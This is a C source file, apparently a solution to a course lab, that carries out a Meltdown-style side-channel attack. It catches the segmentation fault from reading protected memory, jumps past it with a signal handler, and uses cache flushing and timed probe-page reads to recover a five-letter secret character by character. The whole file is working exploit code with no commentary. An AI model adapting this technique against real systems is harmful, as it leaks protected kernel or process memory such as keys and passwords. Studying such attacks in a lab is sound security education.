#include "recover_protected_local_secret.h"

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

#define __USE_GNU
#include <signal.h>

#include "util.h"

extern uint8_t label[];

const size_t MIN_CHOICE = 'A' - 1;
const size_t MAX_CHOICE = 'Z' + 1;
const size_t SECRET_LENGTH = 5;
const size_t THRESHHOLD = 198;

static inline page_t *init_pages(void) {
    page_t *pages = calloc(UINT8_MAX + 1, PAGE_SIZE);
    assert(pages != NULL);
    return pages;
}

static inline void flush_all_pages(page_t *pages) {
    for (size_t i = 'A' - 1; i < 'Z' + 1; i++) {
        flush_cache_line(pages + i);
    }
}

static inline size_t guess_accessed_page(page_t *pages) {
    for (size_t i = 'A' - 1; i < 'Z' + 1; i++) {
        if (time_read(pages + i) < THRESHHOLD && time_read(pages + i) < THRESHHOLD) {
            return i;
        }
    }
    return 0;
}

static inline void do_access(page_t *pages, size_t secret_index) {
    cache_secret();
    force_read(pages + access_secret(secret_index));
}

static void sigsegv_handler(int signum, siginfo_t *siginfo, void *context) {
    ucontext_t *ucontext = (ucontext_t *) context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t) label;
}

int main() {
    struct sigaction act = {.sa_sigaction = sigsegv_handler, .sa_flags = SA_SIGINFO};
    sigaction(SIGSEGV, &act, NULL);

    page_t *pages = init_pages();

    for (size_t i = 0; i < SECRET_LENGTH; i++) {
        flush_all_pages(pages);
        cache_secret();
        do_access(pages, i);
        asm volatile("label:");

        size_t accessed_page = guess_accessed_page(pages);
        if (accessed_page < 'A' - 1 || accessed_page > 'Z' + 1) {
            i--;
        } else {
            printf("%c", (char) accessed_page);
        }
    }

    printf("\n");
    free(pages);
}
